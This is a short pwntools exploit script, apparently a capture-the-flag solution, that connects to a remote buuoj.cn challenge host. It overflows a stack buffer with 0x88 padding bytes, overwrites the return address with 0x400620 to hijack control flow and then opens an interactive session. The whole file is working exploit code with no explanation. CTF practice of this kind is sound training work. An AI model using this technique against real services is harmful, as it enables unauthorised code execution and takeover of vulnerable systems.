from pwn import *
context.log_level="debug"
sh=remote("node4.buuoj.cn",26324)
#sh=process("./timu")
payload=0x88*b'a'+p64(0x0000000000400620)
sh.recv()
sh.sendline(payload)
print(sh.recv())
sh.interactive()
